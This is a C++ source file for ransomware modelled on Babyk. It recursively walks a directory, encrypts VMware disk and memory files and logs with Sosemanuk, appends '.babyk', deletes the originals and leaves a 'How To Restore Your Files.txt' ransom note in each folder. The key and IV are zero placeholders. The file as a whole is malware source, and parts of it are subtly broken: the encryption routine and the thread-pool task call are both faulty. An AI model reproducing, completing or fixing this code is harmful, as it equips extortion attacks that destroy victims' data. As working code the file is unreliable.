#include <iostream>
#include <filesystem>
#include <fstream>
#include <vector>
#include <regex>
#include <thread>
#include <future>
#include <chrono>
#include <atomic>
#include <thpool.h>
#include "curve25519-donna.h"
#include "sosemanuk.h"
#include "sha256.h"

using namespace std;
namespace fs = std::filesystem;

const string HOW_TO_RESTORE_FILE = "How To Restore Your Files.txt";
const string BABYK_EXT = ".babyk";
const regex TARGET_FILE_REGEX(R"(\.(log|vmdk|vmem|vswp|vmsn)$)");

atomic<size_t> encrypted_files_count(0);
atomic<size_t> skipped_files_count(0);
atomic<size_t> total_files_count(0);
atomic<size_t> encrypted_bytes_count(0);

void create_how_to_restore_file(const fs::path& path) {
	ofstream file(path / HOW_TO_RESTORE_FILE);
	if (file.is_open()) {
		file << "To restore your files, follow the instructions below..." << endl;
		file.close();
	}
}

void encrypt_file(const fs::path& file_path) {
	ifstream input(file_path, ios::binary);
	if (!input.is_open()) {
		skipped_files_count++;
		return;
	}

	// Reading the file
	input.seekg(0, ios::end);
	size_t file_size = input.tellg();
	input.seekg(0, ios::beg);
	vector<unsigned char> file_data(file_size);
	input.read(reinterpret_cast<char*>(file_data.data()), file_size);
	input.close();

	// Encryption
	sosemanuk_key_context key_context;
	sosemanuk_iv_context iv_context;
	sosemanuk_run_context run_context;
	unsigned char key[32] = { 0 };    // Replace with a proper key
	unsigned char iv[16] = { 0 };     // Replace with a proper IV

	sosemanuk_schedule(&key_context, key, sizeof(key));
	sosemanuk_init(&iv_context, &key_context, iv, sizeof(iv));
	sosemanuk_run(&run_context, &iv_context, file_data.data(), file_data.size());

	// Save the encrypted file
	ofstream output(file_path.string() + BABYK_EXT, ios::binary);
	if (output.is_open()) {
		output.write(reinterpret_cast<char*>(file_data.data()), file_size);
		output.close();
		fs::remove(file_path);
		encrypted_files_count++;
		encrypted_bytes_count += file_size;
	}
	else {
		skipped_files_count++;
	}
}

void traverse_and_encrypt(const fs::path& path, threadpool& thpool) {
	try {
		for (const auto& entry : fs::directory_iterator(path)) {
			if (entry.is_directory()) {
				create_how_to_restore_file(entry.path());
				traverse_and_encrypt(entry.path(), thpool);
			}
			else if (entry.is_regular_file()) {
				total_files_count++;
				if (regex_search(entry.path().filename().string(), TARGET_FILE_REGEX)) {
					thpool_add_work(thpool, (void(*)(void*))encrypt_file, (void*)&entry.path());
				}
				else {
					skipped_files_count++;
				}
			}
		}
	}
	catch (const fs::filesystem_error& e) {
		cerr << "Error: " << e.what() << endl;
	}
}

int main(int argc, char* argv[]) {
	if (argc < 2) {
		cerr << "Usage: " << argv[0] << " <directory_to_encrypt>" << endl;
		return 1;
	}

	fs::path path_to_encrypt(argv[1]);
	if (!fs::exists(path_to_encrypt) || !fs::is_directory(path_to_encrypt)) {
		cerr << "Error: Invalid directory provided" << endl;
		return 1;
	}
	size_t num_threads = std::thread::hardware_concurrency();
	threadpool thpool = thpool_init(num_threads);

	auto start_time = chrono::high_resolution_clock::now();
	traverse_and_encrypt(path_to_encrypt, thpool);
	thpool_wait(thpool);
	auto end_time = chrono::high_resolution_clock::now();

	thpool_destroy(thpool);

	chrono::duration<double> duration = end_time - start_time;

	cout << "Encryption completed." << endl;
	cout << "Statistics:" << endl;
	cout << "  Encrypted files count: " << encrypted_files_count << endl;
	cout << "  Skipped files count: " << skipped_files_count << endl;
	cout << "  Total files count: " << total_files_count << endl;
	cout << "  Encrypted bytes count: " << encrypted_bytes_count << endl;
	cout << "  Time taken: " << duration.count() << " seconds" << endl;

	return 0;
}
